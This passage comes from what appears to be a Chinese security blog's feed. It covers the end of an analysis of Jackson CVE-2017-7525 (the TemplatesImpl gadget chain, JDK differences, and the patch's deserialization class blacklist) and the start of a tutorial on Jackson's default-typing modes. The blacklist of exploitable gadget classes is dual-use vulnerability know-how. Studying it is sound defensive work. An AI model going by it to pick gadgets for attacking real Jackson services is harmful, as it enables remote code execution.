href="#0x06-高版本JDK不能触发的原因——-tfactory" class="headerlink" title="0x06 高版本JDK不能触发的原因——_tfactory"></a>0x06 高版本JDK不能触发的原因——_tfactory</h2><p>在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。</p><p>当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。</p><p>在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/8.png" alt=""></p><p>区别在于新建TransletClassLoader类实例的代码，其中调用了<code>_factory</code>属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。</p><p>那么如何设置这个<code>_factory</code>属性呢？我们在PoC中随便填入如<code>&#39;_factory&#39;:{},</code>，会看到如下错误信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field &quot;_factory&quot; (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: &quot;uriresolver&quot;, &quot;transletBytecodes&quot;, &quot;outputProperties&quot;, &quot;transletName&quot;, &quot;stylesheetDOM&quot;])</span><br></pre></td></tr></table></figure><p>可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。</p><p>在里面没有看到tfactory相关字样，也就是说，<strong>Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性</strong>。</p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><p>这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。</p><p>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: Illegal type (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) to deserialize: prevented for security reasons</span><br></pre></td></tr></table></figure><p>调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/9.png" alt=""></p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/10.png" alt=""></p><p>注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。</p><p>在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599]</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>OK，17年经典的Jackson反序列化漏洞就说到这，利用链是和Fastjson一样的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，两者的利用链很多都是可以共用的，但是会有些细微的区别。下一篇文章看看Jackson其他反序列化利用链及CVE漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列一——反序列化漏洞基本原理</title>
    <link href="https://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2019/11/13/Jackson系列一——反序列化漏洞基本原理/</id>
    <published>2019-11-13T15:01:02.000Z</published>
    <updated>2019-11-16T08:52:26.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Jackson简介"><a href="#0x01-Jackson简介" class="headerlink" title="0x01 Jackson简介"></a>0x01 Jackson简介</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p><p>由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。</p><h2 id="0x02-使用Jackson进行序列化和反序列化"><a href="#0x02-使用Jackson进行序列化和反序列化" class="headerlink" title="0x02 使用Jackson进行序列化和反序列化"></a>0x02 使用Jackson进行序列化和反序列化</h2><p>Jackson提供了ObjectMapper.writeValueAsString()和ObjectMapper.readValue()两个方法来实现序列化和反序列化的功能。</p><p>我本地测试用到的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9</p><p>定义Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s"</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea</span><br></pre></td></tr></table></figure><h2 id="0x03-多态问题的解决——JacksonPolymorphicDeserialization"><a href="#0x03-多态问题的解决——JacksonPolymorphicDeserialization" class="headerlink" title="0x03 多态问题的解决——JacksonPolymorphicDeserialization"></a>0x03 多态问题的解决——JacksonPolymorphicDeserialization</h2><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。</p><p>下面具体介绍一下。</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson提供一个enableDefaultTyping设置，其包含4个值，查看jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java可看到相关介绍信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> DefaultTyping &#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       JAVA_LANG_OBJECT,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * "natural" types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_FINAL</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>默认情况下，即无参数的enableDefaultTyping是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p><p>下面分别对这几个选项进行说明。</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类）</p><p>添加一个com.mi1k7ea.Hacker类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String skill = <span class="string">"Jackson"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Person类，添加Object类型属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，添加enableDefaultTyping()并设置为JAVA_LANG_OBJECT：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">        </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出对比看到，通过enableDefaultTyping()设置设置JAVA_LANG_OBJECT后，会多输出Hacker类名，且在输出的Object属性时直接输出的是Hacker类对象，也就是说同时对Object属性对象进行了序列化和反序列化操作：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 设置JAVA_LANG_OBJECT</span><br><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@7f9a81e8</span><br><span class="line"></span><br><span class="line">// 未设置JAVA_LANG_OBJECT</span><br><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125;</span><br></pre></td></tr></table></figure><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>添加com.mi1k7ea.Sex接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加com.mi1k7ea.MySex类实现Sex接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        <span class="comment">// 或直接无参调用，输出一样</span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();</span></span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592</span><br></pre></td></tr></table></figure><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。</p><p>下面直接修改JSTest.java，在Object属性中存在的是数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> Hacker[<span class="number">2</span>];</span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> Hacker();</span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.object = hackers;</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，类名变成了”[L”+类名+”;”，序列化Object之后为数组形式，反序列化之后得到[Lcom.mi1k7ea.Hacker;类对象，说明对Array类型成功进行了序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"[Lcom.mi1k7ea.Hacker;"</span>,[&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, [Lcom.mi1k7ea.Hacker;@724af044, com.mi1k7ea.MySex@4678c730</span><br></pre></td></tr></table></figure><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p><p>修改Person类，添加Hacker属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 